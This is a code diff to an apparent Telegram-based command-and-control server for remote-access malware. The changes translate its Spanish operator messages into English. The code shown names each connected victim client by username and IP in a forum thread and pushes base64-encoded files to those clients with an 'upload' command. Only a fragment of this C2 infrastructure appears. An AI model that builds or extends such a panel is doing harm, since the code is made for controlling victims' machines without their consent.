@@ -129,7 +129,7 @@ class C2Server:
 
             conn = sqlite3.connect("c2.db")
             cursor = conn.cursor()
-            topic_title = f"Cliente {session.username} ({session.ip})"
+            topic_title = f"Client {session.username} ({session.ip})"
             response = bot.create_forum_topic(C2_CHANNEL_ID, topic_title)
             session.topic_id = response.message_thread_id
 
@@ -410,7 +410,7 @@ class C2Server:
 def handle_document(message):
     bot.send_message(C2_CHANNEL_ID, "📁 Uploading File...", message_thread_id=message.message_thread_id)
     if not message.message_thread_id:
-        bot.reply_to(message, "❌ Este archivo debe mandarse dentro de un hilo de cliente.")
+        bot.reply_to(message, "❌ This file needs to be sended to a client.")
         return
 
     try:
@@ -426,21 +426,21 @@ def handle_document(message):
         conn.close()
 
         if not result:
-            bot.reply_to(message, "❌ No se encontró el cliente para este hilo.")
+            bot.reply_to(message, "❌ No client for this thread.")
             return
 
         client_ip = result[0]
         session = c2.clients.get(client_ip)
 
         if not session:
-            bot.reply_to(message, "❌ Cliente no conectado.")
+            bot.reply_to(message, "❌ Cliente offline.")
             return
 
         command = f"upload {file_data_b64} {file_name}"
         c2.send_command_to_client(session, command, message.message_thread_id)
 
     except Exception as e:
-        bot.reply_to(message, f"❌ Error procesando el archivo: {e}")
+        bot.reply_to(message, f"❌ Error while processing the file: {e}")
 
 
 if __name__ == "__main__":
